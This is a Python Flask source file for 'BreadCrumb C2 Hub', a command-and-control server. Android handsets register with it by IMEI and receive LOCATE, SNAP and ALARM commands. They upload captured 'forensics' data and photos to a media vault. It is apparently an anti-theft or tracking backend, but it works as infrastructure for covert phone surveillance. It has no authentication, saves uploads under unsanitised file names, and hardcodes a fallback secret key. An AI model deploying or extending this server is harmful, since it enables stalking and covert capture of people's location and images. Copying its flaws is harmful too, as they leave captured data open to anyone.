import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string, redirect, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "breadcrumb_super_secret_key_911")

DB_PATH = "breadcrumb_cloud.db"

def get_db_connection():
    """Creates a database connection with WAL mode and a high timeout to prevent locking stalls."""
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    conn.execute('PRAGMA journal_mode=WAL;')
    return conn

def init_db():
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
                        imei TEXT PRIMARY KEY,
                        make_model TEXT,
                        status TEXT,
                        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS forensics (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        imei TEXT,
                        data_type TEXT,
                        content TEXT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        imei TEXT,
                        command TEXT,
                        status TEXT DEFAULT 'PENDING',
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
        c.execute('''CREATE TABLE IF NOT EXISTS media (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        imei TEXT,
                        filename TEXT,
                        filepath TEXT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
        conn.commit()
    finally:
        conn.close()

init_db()

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Project BreadCrumb - Dispatch Hub</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; margin: 0; padding: 15px; }
        .header { border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; }
        h1 { margin: 0; color: #38bdf8; font-size: 20px; }
        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
        @media (min-width: 768px) { .grid { grid-template-columns: 280px 1fr; } }
        .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
        .device-item { padding: 10px; background: #0f172a; border-radius: 6px; margin-bottom: 8px; cursor: pointer; border: 1px solid #334155; }
        .device-item.active { border-color: #38bdf8; background: #09203f; }
        .device-item a { color: #f8fafc; text-decoration: none; display: block; }
        pre { background: #0f172a; padding: 10px; border-radius: 6px; overflow-x: auto; color: #38bdf8; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; }
        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
        button { padding: 8px 12px; background: #0284c7; border: none; color: white; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 12px; }
        button:hover { background: #0369a1; }
        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 8px; }
        .media-thumb { width: 100%; height: 100px; object-fit: cover; border-radius: 6px; border: 1px solid #334155; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ BreadCrumb C2 Hub</h1>
    </div>
    
    <div class="grid">
        <div>
            <div class="card">
                <h3>Handsets</h3>
                {% if devices %}
                    {% for d in devices %}
                        <div class="device-item {% if d['imei'] == selected_imei %}active{% endif %}">
                            <a href="{{ url_for('admin_dashboard', imei=d['imei']) }}">
                                <strong>{{ d['make_model'] }}</strong><br>
                                <small style="color: #94a3b8;">IMEI: {{ d['imei'] }}</small><br>
                                <small style="color: #22c55e;">Status: {{ d['status'] }}</small>
                            </a>
                        </div>
                    {% endfor %}
                {% else %}
                    <p style="color: #94a3b8; font-size: 13px;">No devices synced yet.</p>
                {% endif %}
            </div>
        </div>
        
        <div>
            {% if selected_imei %}
                <div class="card">
                    <h3>Controls ({{ selected_imei }})</h3>
                    <form method="POST" action="{{ url_for('dispatch_command', imei=selected_imei) }}" class="btn-group">
                        <button name="cmd" value="LOCATE">📍 Locate</button>
                        <button name="cmd" value="SNAP">📸 Snap</button>
                        <button name="cmd" value="ALARM">🚨 Alarm</button>
                    </form>
                </div>
                
                <div class="card">
                    <h3>Media Vault</h3>
                    {% if media_files %}
                        <div class="media-grid">
                            {% for m in media_files %}
                                <div>
                                    <a href="{{ m['filepath'] }}" target="_blank">
                                        <img src="{{ m['filepath'] }}" class="media-thumb" alt="{{ m['filename'] }}">
                                    </a>
                                    <small style="color: #94a3b8; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ m['filename'] }}</small>
                                </div>
                            {% endfor %}
                        </div>
                    {% else %}
                        <p style="color: #94a3b8; font-size: 13px;">No media captured.</p>
                    {% endif %}
                </div>

                <div class="card">
                    <h3>Telemetry Stream</h3>
                    {% if forensics %}
                        {% for f in forensics %}
                            <div style="margin-bottom: 12px;">
                                <strong style="color: #38bdf8;">{{ f['data_type'] }}</strong> <small style="color: #64748b;">({{ f['timestamp'] }})</small>
                                <pre>{{ f['content'] }}</pre>
                            </div>
                        {% endfor %}
                    {% else %}
                        <p style="color: #94a3b8; font-size: 13px;">No logs uploaded yet.</p>
                    {% endif %}
                </div>
            {% else %}
                <div class="card">
                    <p style="color: #94a3b8;">Select a handset from the left panel.</p>
                </div>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def admin_dashboard():
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("SELECT * FROM devices ORDER BY last_seen DESC")
        devices = c.fetchall()
        
        selected_imei = request.args.get('imei', devices[0]['imei'] if devices else None)
        
        forensics = []
        media_files = []
        if selected_imei:
            c.execute("SELECT * FROM forensics WHERE imei = ? ORDER BY timestamp DESC LIMIT 50", (selected_imei,))
            forensics = c.fetchall()
            c.execute("SELECT * FROM media WHERE imei = ? ORDER BY timestamp DESC", (selected_imei,))
            media_files = c.fetchall()
    finally:
        conn.close()
    
    return render_template_string(DASHBOARD_TEMPLATE, devices=devices, selected_imei=selected_imei, forensics=forensics, media_files=media_files)

@app.route('/api/sync', methods=['POST'])
def api_sync():
    data = request.json
    if not data or 'imei' not in data:
        return jsonify({"error": "Missing IMEI"}), 400
    
    imei = data['imei']
    make_model = data.get('make_model', 'Android Agent')
    status = data.get('status', 'Online')
    
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO devices (imei, make_model, status, last_seen) 
                     VALUES (?, ?, ?, CURRENT_TIMESTAMP) 
                     ON CONFLICT(imei) DO UPDATE SET make_model=?, status=?, last_seen=CURRENT_TIMESTAMP""",
                  (imei, make_model, status, make_model, status))
        conn.commit()
    finally:
        conn.close()
    return jsonify({"status": "success"})

@app.route('/api/poll-commands', methods=['GET'])
def api_poll_commands():
    imei = request.args.get('imei')
    if not imei:
        return jsonify([])
    
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE imei = ? AND status = 'PENDING'", (imei,))
        rows = c.fetchall()
        
        cmds = []
        for r in rows:
            cmds.append({"id": r[0], "command": r[1]})
            c.execute("UPDATE commands SET status = 'EXECUTED' WHERE id = ?", (r[0],))
        
        conn.commit()
    finally:
        conn.close()
    return jsonify(cmds)

@app.route('/api/upload-forensics', methods=['POST'])
def api_upload_forensics():
    data = request.json
    if not data or 'imei' not in data or 'data_type' not in data:
        return jsonify({"error": "Invalid payload"}), 400
    
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("INSERT INTO forensics (imei, data_type, content) VALUES (?, ?, ?)",
                  (data['imei'], data['data_type'], str(data['content'])))
        conn.commit()
    finally:
        conn.close()
    return jsonify({"status": "success"})

@app.route('/api/upload-media', methods=['POST'])
def api_upload_media():
    imei = request.form.get('imei')
    file = request.files.get('file')
    if not imei or not file:
        return jsonify({"error": "Missing IMEI or file"}), 400
    
    upload_folder = os.path.join("static", "uploads")
    os.makedirs(upload_folder, exist_ok=True)
    
    filepath = os.path.join(upload_folder, file.filename)
    file.save(filepath)
    
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("INSERT INTO media (imei, filename, filepath) VALUES (?, ?, ?)",
                  (imei, file.filename, f"/{filepath}"))
        conn.commit()
    finally:
        conn.close()
    return jsonify({"status": "success"})

@app.route('/dispatch/<imei>', methods=['POST'])
def dispatch_command(imei):
    cmd = request.form.get('cmd')
    if cmd:
        conn = get_db_connection()
        try:
            c = conn.cursor()
            c.execute("INSERT INTO commands (imei, command, status) VALUES (?, ?, 'PENDING')", (imei, cmd))
            conn.commit()
        finally:
            conn.close()
        
    return redirect(url_for('admin_dashboard', imei=imei))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
